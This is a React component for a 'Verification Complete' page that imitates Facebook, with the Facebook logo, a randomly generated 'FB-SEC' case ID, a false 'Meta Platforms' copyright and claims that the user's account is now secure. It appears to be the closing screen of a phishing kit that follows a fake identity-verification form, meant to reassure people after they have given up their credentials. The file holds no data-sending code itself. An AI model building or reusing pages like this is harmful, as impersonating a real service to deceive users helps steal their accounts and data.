import React from 'react';
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Check, Shield, Lock, User2, AlertTriangle, TicketIcon, CheckCircle2 } from "lucide-react";

export default function SuccessPage() {
  const [, setLocation] = useLocation();

  // Get ticket number from localStorage for consistency across pages
  const ticketNumber = localStorage.getItem('securityTicket') || 
    `FB-SEC-${Math.floor(10000000 + Math.random() * 90000000)}`;

  const handleRestart = () => {
    // Clear the ticket on restart
    localStorage.removeItem('securityTicket');
    setLocation("/");
  };

  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('en-US', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });

  return (
    <>
      <Card className="w-full bg-white rounded-lg shadow-md">
        <CardContent className="p-8">
          <div className="flex justify-between items-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-10"
            />
            <div className="flex items-center">
              <div className="flex items-center bg-green-50 px-3 py-1 rounded-full mr-3">
                <CheckCircle2 className="h-3.5 w-3.5 text-green-600 mr-1.5" />
                <span className="text-xs font-medium text-green-600">RESOLVED</span>
              </div>
              <div className="flex items-center bg-blue-50 px-3 py-1 rounded-full">
                <TicketIcon className="h-3.5 w-3.5 text-facebook-blue mr-1.5" />
                <span className="text-xs font-medium text-facebook-blue">Case ID: {ticketNumber}</span>
              </div>
            </div>
          </div>
          
          <div className="md:flex md:items-start mb-8">
            <div className="flex justify-center mb-6 md:mb-0 md:mr-6 md:flex-shrink-0">
              <span className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                <Check className="text-[#42B72A] h-8 w-8" />
              </span>
            </div>
            <div className="text-center md:text-left">
              <h1 className="text-2xl font-bold text-[#1C1E21] mb-2">Verification Complete</h1>
              <p className="text-gray-600">
                Thank you for verifying your identity. Your account has been secured and the unusual login alert has been removed.
              </p>
              <div className="mt-2 p-2 bg-green-50 rounded-md inline-block">
                <p className="text-sm text-green-700 flex items-center">
                  <CheckCircle2 className="h-4 w-4 mr-1.5" />
                  Security issue resolved on {formattedDate}
                </p>
              </div>
            </div>
          </div>
          
          <div className="grid md:grid-cols-2 gap-6 mb-6">
            <div className="bg-blue-50 p-5 rounded-lg">
              <h3 className="font-bold text-blue-700 mb-3 pb-2 border-b border-blue-100">How to Prevent Future Login Alerts:</h3>
              <ul className="text-sm text-gray-700 space-y-3">
                <li className="flex items-start">
                  <Shield className="h-5 w-5 text-facebook-blue mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Enable Two-Factor Authentication</span>
                    <p className="text-xs mt-0.5">Add an extra layer of security by requiring a security code in addition to your password. Go to Settings &gt; Security and Login &gt; Two-Factor Authentication.</p>
                  </div>
                </li>
                <li className="flex items-start">
                  <Lock className="h-5 w-5 text-facebook-blue mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Use a Strong, Unique Password</span>
                    <p className="text-xs mt-0.5">Create a password that is at least 8 characters long with a mix of numbers, letters, and special characters. Don't reuse passwords across websites.</p>
                  </div>
                </li>
              </ul>
            </div>
            
            <div className="bg-gray-50 p-5 rounded-lg">
              <h3 className="font-bold text-gray-700 mb-3 pb-2 border-b border-gray-200">More Security Best Practices:</h3>
              <ul className="text-sm text-gray-700 space-y-3">
                <li className="flex items-start">
                  <User2 className="h-5 w-5 text-facebook-blue mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Recognize Your Devices</span>
                    <p className="text-xs mt-0.5">When logging in from a new device, check "Remember this device" to add it to your recognized devices list.</p>
                  </div>
                </li>
                <li className="flex items-start">
                  <AlertTriangle className="h-5 w-5 text-amber-500 mr-2 mt-0.5 flex-shrink-0" />
                  <div>
                    <span className="font-medium">Check Active Sessions</span>
                    <p className="text-xs mt-0.5">Regularly review and log out of unfamiliar sessions in Settings &gt; Security and Login &gt; Where You're Logged In.</p>
                  </div>
                </li>
              </ul>
            </div>
          </div>
          
          <div className="bg-white border border-gray-200 rounded-lg p-5 mb-6 shadow-sm">
            <h3 className="font-semibold text-gray-700 mb-4">Next Steps to Secure Your Account:</h3>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="bg-gray-50 p-3 rounded border border-gray-200">
                <div className="flex flex-col h-full">
                  <div className="flex items-center mb-2">
                    <Shield className="h-5 w-5 text-facebook-blue mr-2" />
                    <h4 className="font-medium text-gray-700">Review Activity</h4>
                  </div>
                  <p className="text-xs text-gray-600 mb-3 flex-grow">Check your recent login history for any suspicious activity</p>
                  <Button variant="outline" size="sm" className="w-full text-xs">
                    View Activity
                  </Button>
                </div>
              </div>
              
              <div className="bg-gray-50 p-3 rounded border border-gray-200">
                <div className="flex flex-col h-full">
                  <div className="flex items-center mb-2">
                    <User2 className="h-5 w-5 text-facebook-blue mr-2" />
                    <h4 className="font-medium text-gray-700">Recovery Options</h4>
                  </div>
                  <p className="text-xs text-gray-600 mb-3 flex-grow">Update your account recovery email and phone number</p>
                  <Button variant="outline" size="sm" className="w-full text-xs">
                    Update
                  </Button>
                </div>
              </div>
              
              <div className="bg-gray-50 p-3 rounded border border-gray-200">
                <div className="flex flex-col h-full">
                  <div className="flex items-center mb-2">
                    <Lock className="h-5 w-5 text-facebook-blue mr-2" />
                    <h4 className="font-medium text-gray-700">Two-Factor Auth</h4>
                  </div>
                  <p className="text-xs text-gray-600 mb-3 flex-grow">Add an extra layer of security to your account</p>
                  <Button variant="outline" size="sm" className="w-full text-xs">
                    Set Up
                  </Button>
                </div>
              </div>
            </div>
          </div>
          
          <div className="flex flex-col md:flex-row md:justify-between md:items-center">
            <p className="text-sm text-gray-600 mb-4 md:mb-0 md:max-w-md">
              Your account is now secure. This device has been added to your list of recognized devices.
            </p>
            
            <Button
              className="w-full md:w-auto px-8 bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-3 rounded-md transition-colors duration-200"
              onClick={handleRestart}
            >
              Continue to Facebook
            </Button>
          </div>
        </CardContent>
      </Card>

      <div className="w-full text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p>© Facebook 2023 • Meta Platforms, Inc.</p>
      </div>
    </>
  );
}
